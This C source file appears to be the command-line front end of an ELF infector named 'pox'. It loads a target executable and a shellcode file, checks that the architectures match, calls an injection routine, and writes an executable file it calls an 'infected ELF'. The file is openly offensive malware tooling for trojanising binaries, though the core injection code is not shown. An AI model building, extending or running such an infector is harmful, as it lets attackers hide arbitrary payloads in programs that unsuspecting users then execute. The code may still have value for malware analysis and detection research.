#include "pox.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

static byte_t* readfile(const char *filename, size_t *pelf_len);
static arch_t getarch(const byte_t *elf, size_t elf_len);

int main(int argc, char **argv){
    if(argc != 4 || strlen(argv[3]) != 2 ||
                !((argv[3][0] == '3' && argv[3][1] == '2') || (argv[3][0] == '6' && argv[3][1] == '4'))
            ){
        fprintf(stderr, "Usage: %s <target file> <shellcode> <shellcode arch 32|64>\n", argv[0]);
        return -1;
    }

    char out_path[0x100];
    int ret = 0;
    size_t flen_target, flen_payload;
    bin_t bin_target, bin_payload, bin_out;
    byte_t *fbuf_target = NULL, *fbuf_payload = NULL,
                  *buf_tmp = NULL, *buf_out = NULL;

    /* Read target ELF and shellcode binary into payload */
    if((fbuf_target = readfile(argv[1], &flen_target)) == NULL){
        fprintf(stderr, "Unable to read file '%s'\n", argv[1]);
        ret = -1;
        goto cleanup;
    }

    if((fbuf_payload = readfile(argv[2], &flen_payload)) == NULL){
        fprintf(stderr, "Unable to read file '%s'\n", argv[2]);
        ret = -1;
        goto cleanup;
    }

    fprintf(stdout,
            "Loaded Target (%zu bytes)\n"
            "Loaded Payload (%zu bytes)",
            flen_target, flen_payload);

    /* Set up bin_t objects used by pox API */
    bin_target = (bin_t){
        .base = fbuf_target,
        .arch = getarch(fbuf_target, flen_target),
        .len=flen_target,
    };

    switch(bin_target.arch){
        case ARCH_32:
            fprintf(stdout, "Detected 32-bit ELF payload\n");
            break;
        case ARCH_64:
            fprintf(stdout, "Detected 64-bit ELF payload\n");
            break;
        default:
            ret = -1;
            goto cleanup;
    };

    bin_payload = (bin_t){
        .base = fbuf_payload,
        .arch = \
                (argv[3][0] == '3' && argv[3][1] == '2') ? ARCH_32 : 
                (argv[3][0] == '6' && argv[3][1] == '4') ? ARCH_64 :
                ARCH_UK,
        .len = flen_payload,
    };

    /* sanity check, make sure shellcode provided matches target ELF */
    if(bin_payload.arch == ARCH_UK){
        fprintf(stderr, "Invalid Arch '%s': should be '32' or '64'\n", argv[3]);
        ret = -1;
        goto cleanup;
    }

    if(bin_target.arch != bin_payload.arch){
        fprintf(stderr, "Target ELF and shellcode architecture do not match");
    }

    //bool pox(const bin_t *elf, const bin_t *payload, bin_t *out, byte_t *buf_tmp, byte_t *buf_out){
    if((buf_tmp = malloc(bin_target.len)) == NULL
            || (buf_out = malloc(bin_target.len + pox_padlen(&bin_target, bin_payload.len))) == NULL){
        printf("Failed to allocate\n");
        ret = -1;
        goto cleanup;
    }

    pox(&bin_target, &bin_payload, &bin_out, buf_tmp, buf_out);

    snprintf(out_path, sizeof(out_path), "%s.op8", argv[1]);
    printf("Creating infected ELF '%s'\n", out_path);
    FILE *f = fopen(out_path, "w");
    if(!f){
        perror("Bad Thing\n");
        goto cleanup;
    }

    if(fwrite(bin_out.base, 1, bin_out.len, f) != bin_out.len){
        ret = -1;
        goto cleanup;
    }

    struct stat buf;
    fstat(fileno(f), &buf);
    fchmod(fileno(f), buf.st_mode | S_IXUSR | S_IXGRP | S_IXOTH);
    fclose(f);

cleanup:
    printf("Cleaning up...\n");
    free(buf_tmp);
    free(buf_out);
    free(fbuf_target);
    free(fbuf_payload);
    return ret;
}

/* Read a file into memory from a path name */
static byte_t* readfile(const char *filename, size_t *pelf_len) {
    byte_t *buf;
    FILE *f;
    long size;
    
    if(!(f=fopen(filename, "r"))){
        return NULL;
    }

    fseek(f, 0, SEEK_END);
    size = ftell(f);
    fseek(f, 0, SEEK_SET);

    if(!(buf = malloc(size))) {
		return NULL;
    }

    if(fread(buf, 1, size, f) != size) {
        return NULL;
	}

	fclose(f);
    if(pelf_len){
        *pelf_len = size;
    }
    return buf;
}

static arch_t getarch(const byte_t *elf, size_t elf_len){
    if(elf_len < 0x7c) {  // minimum ELF header size
        return ARCH_UK;
    }

    union magic_t magic_val =               // get magic header of provided ELF
        { .m0=elf[0], .m1=elf[1], .m2=elf[2], .m3=elf[3] };

    static const union magic_t magic_elf =  // static proper ELF magic value
        { .m0=ELFMAG0, .m1=ELFMAG1, .m2=ELFMAG2, .m3=ELFMAG3 };

    if(magic_val.val != magic_elf.val){
        return ARCH_UK;
    }

    switch(elf[0x12]){
        case 0x03:
            return ARCH_32;
        case 0x3E:
            return ARCH_64;
    }

    return ARCH_UK;
}

